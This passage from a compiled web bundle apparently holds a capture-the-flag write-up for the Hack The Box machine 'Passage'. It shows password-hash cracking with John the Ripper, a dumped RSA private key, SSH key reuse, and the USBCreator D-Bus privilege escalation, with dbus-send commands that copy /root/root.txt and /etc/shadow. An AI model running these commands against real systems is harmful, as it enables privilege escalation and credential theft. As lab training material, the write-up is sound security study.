cracked."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"admin:7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1\nsid:4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88\npaul:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd\nkim:f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca\negre55:4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc\nhacker:e7d3685715939842749cc27b38d0ccb9706d4d14a5304ef9eee093780eab5df9\n")),(0,s.kt)("p",null,"I used  to identify the hash type that looks like SHA-256."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ haiti 7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1\nSnefru-256 [JtR: snefru-256]\nSHA-256 [HC: 1400] [JtR: raw-sha256]\nRIPEMD-256\nHaval-256 [JtR: haval-256-3]\nGOST R 34.11-94 [HC: 6900] [JtR: gost]\nGOST CryptoPro S-Box\nSHA3-256 [HC: 17400]\nKeccak-256 [HC: 17800] [JtR: raw-keccak-256]\nSkein-256 [JtR: skein-256]\nSkein-512(256)\n")),(0,s.kt)("p",null,"And then used John the Ripper to crack some of them:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ john hashes.txt -w /usr/share/wordlists/passwords/rockyou.txt --format=Raw-SHA256\nUsing default input encoding: UTF-8\nLoaded 6 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 AVX 4x])\nWarning: poor OpenMP scalability for this hash type, consider --fork=8\nWill run 8 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nhacker           (hacker)\natlanta1         (paul)\n")),(0,s.kt)("p",null,"Two users are on the system: paul & nadav, and hopefully we cracked paul's\npassword so we are able to connect as paul and obtain the first flag."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul\nsu paul\nPassword: atlanta1\n\npaul@passage:/var/www/html/CuteNews/cdata/users$ cd\ncd\npaul@passage:~$ cat user.txt\ncat user.txt\n82727a23b73c48168c14aba87fc6a769\n")),(0,s.kt)("h2",{id:"waypoint"},"Waypoint"),(0,s.kt)("p",null,"Let's save paul's SSH key as a waypoint because only SSH pubkey method is allowed."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ paul@passage:~$ cat .ssh/id_rsa\ncat .ssh/id_rsa\n-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/\n+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i\nZ2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt\nrWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ\nJjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok\nsjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ\neWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG\nQXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr\nlxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh\nzWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz\nR0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k\n7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio\nGS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4\nIuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE\nLuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR\nAHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0\nVvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt\n1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0\nKnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1\n9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF\nd8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs\nnYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY\nf62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM\nUxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs\nOR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==\n-----END RSA PRIVATE KEY-----\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ chmod 600 paul_rsa.key\n$ ssh paul@passage.htb -i paul_rsa.key\n")),(0,s.kt)("h2",{id:"privilege-escalation-of-machine--paul-to-nadav"},"Privilege Escalation of Machine : paul to nadav"),(0,s.kt)("p",null,"I ran linpeas but that was useless, you had to guess the key was re-used\nby nadav as well, which is not very realistic."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ ssh nadav@passage.htb -i paul_rsa.key\n")),(0,s.kt)("h2",{id:"privilege-escalation-of-machine--nadav-to-root"},"Privilege Escalation of Machine : nadav to root"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ paul@passage:~$ groups nadav\nnadav : nadav adm cdrom sudo dip plugdev lpadmin sambashare\n")),(0,s.kt)("p",null,"It seems we will hack printers."),(0,s.kt)("p",null,"The first clue is that port 631 (Internet Printing Protocol(IPP)) is open on localhost."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ ss -nlpt\nState      Recv-Q Send-Q                                                                         Local Address:Port                                                                                        Peer Address:Port\nLISTEN     0      128                                                                                        *:22                                                                                                     *:*\nLISTEN     0      5                                                                                  127.0.0.1:631                                                                                                    *:*\nLISTEN     0      128                                                                                       :::80                                                                                                    :::*\nLISTEN     0      128                                                                                       :::22                                                                                                    :::*\nLISTEN     0      5                                                                                        ::1:631                                                                                                   :::*\n")),(0,s.kt)("p",null,"A second clue is that nadav is in ",(0,s.kt)("inlineCode",{parentName:"p"},"lpadmin")," group."),(0,s.kt)("p",null,"A third clue if you list process:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ ps -ef f\n...\nroot       9774      1  0 07:35 ?        Ss     0:00 /usr/sbin/cupsd -l\nlp         9779   9774  0 07:35 ?        S      0:00  \\_ /usr/lib/cups/notifier/dbus dbus://\nroot       9775      1  0 07:35 ?        Ssl    0:00 /usr/sbin/cups-browsed\n")),(0,s.kt)("p",null,"Let's find CUPS version:"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ apt policy cups\ncups:\n  Installed: 2.1.3-4ubuntu0.7\n  Candidate: 2.1.3-4ubuntu0.7\n  Version table:\n *** 2.1.3-4ubuntu0.7 100\n        100 /var/lib/dpkg/status\n     2.1.3-4 500\n        500 http://us.archive.ubuntu.com/ubuntu xenial/main amd64 Packages\n")),(0,s.kt)("p",null,"But it seems it's pretty much recent and patched. In fact CUPS was only\na sneaky rabbit hole."),(0,s.kt)("p",null,"We can find some info about some files edited with vim in ",(0,s.kt)("inlineCode",{parentName:"p"},".viminfo"),"."),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"/etc/dbus-1/system.d/com.ubuntu.USBCreator.conf")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-xml"},'<!DOCTYPE busconfig PUBLIC\n "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"\n "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">\n<busconfig>\n\n  \x3c!-- Only root can own the service --\x3e\n  <policy user="root">\n    <allow own="com.ubuntu.USBCreator"/>\n  </policy>\n\n  \x3c!-- Allow anyone to invoke methods (further constrained by\n       PolicyKit privileges --\x3e\n  <policy context="default">\n    <allow send_destination="com.ubuntu.USBCreator"\n           send_interface="com.ubuntu.USBCreator"/>\n    <allow send_destination="com.ubuntu.USBCreator"\n           send_interface="org.freedesktop.DBus.Introspectable"/>\n    <allow send_destination="com.ubuntu.USBCreator"\n           send_interface="org.freedesktop.DBus.Properties"/>\n  </policy>\n\n</busconfig>\n')),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"/etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-ini"},"[Configuration]\nAdminIdentities=unix-group:sudo;unix-group:admin\n")),(0,s.kt)("p",null,"Let's find information on the D-BUS service object:\nSee ",(0,s.kt)("a",{parentName:"p",href:"https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation"},"HackTricks - D-Bus Enumeration & Command Injection Privilege Escalation"),",\n(it's based on ",(0,s.kt)("a",{parentName:"p",href:"https://blog.raw.pm/en/HackTheBox-Oouch-write-up/"},"Oouch  "),")."),(0,s.kt)("p",null,"List interfaces of the service object."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ nadav@passage:~$ busctl tree com.ubuntu.USBCreator\n\u2514\u2500/com\n  \u2514\u2500/com/ubuntu\n    \u2514\u2500/com/ubuntu/USBCreator\n")),(0,s.kt)("p",null,"Introspect an interface of the service object."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ nadav@passage:~$ busctl introspect com.ubuntu.USBCreator /com/ubuntu/USBCreator\nNAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS\ncom.ubuntu.USBCreator               interface -         -            -\n.Image                              method    ssb       -            -\n.KVMOk                              method    -         b            -\n.KVMTest                            method    sa{ss}    -            -\n.Shutdown                           method    -         -            -\n.Unmount                            method    s         -            -\n.Progress                           signal    u         -            -\norg.freedesktop.DBus.Introspectable interface -         -            -\n.Introspect                         method    -         s            -\n")),(0,s.kt)("p",null,"See ",(0,s.kt)("a",{parentName:"p",href:"https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/"},"USBCreator D-Bus Privilege Escalation in Ubuntu Desktop"),"."),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ dbus-send --system --print-reply --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.Image string:/root/root.txt string:/tmp/flag boolean:true\nmethod return time=1599506246.809850 sender=:1.330 -> destination=:1.349 serial=25 reply_serial=2\n\nnadav@passage:/tmp$ cat flag\n47a715c664ab8efbf982251c79968757\n")),(0,s.kt)("h2",{id:"bonus"},"Bonus"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"$ dbus-send --system --print-reply --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.Image string:/etc/shadow string:/tmp/shadow boolean:true\n\n$ cat /tmp/shadow | grep root\nroot:$6$mjc8Tvgr$L56bn5KQDtOyKRdXBTL4xcmT7FVWJbds.Fo0FVc11PWliaNu5ASAxKzaEddyaYGMxGQPUNo5UpxT/nawzS8TW0:18464:0:99999:7:::\n")))}d.isMDXComponent=!0},21664:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/passage-227f59511d1e0ca5aeab83b799c83035.png"}}]);